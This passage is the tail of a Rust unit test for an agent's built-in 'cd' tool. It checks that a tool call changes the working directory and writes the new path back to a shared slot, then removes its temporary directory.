        let mut t = BuiltinTools::new(start.clone()).with_cwd_slot(slot.clone());
        let deep = tmp.join("mypi-cdtest");
        std::fs::create_dir_all(&deep).unwrap();
        let arg = format!("{{\"path\": \"{}\"}}", deep.display());
        let call = ToolCall {
            id: "1".into(),
            kind: "function".into(),
            function: crate::ai::types::FunctionCall {
                name: "cd".into(),
                arguments: arg,
            },
        };
        let r = crate::agent::loop_rs::ToolExecutor::execute(&mut t, &call).unwrap();
        assert!(r.contains("changed to"), "结果说明: {r:?}");
        assert_eq!(*slot.read().unwrap(), deep, "共享槽被写回");
        let _ = std::fs::remove_dir_all(&deep);
    }
}
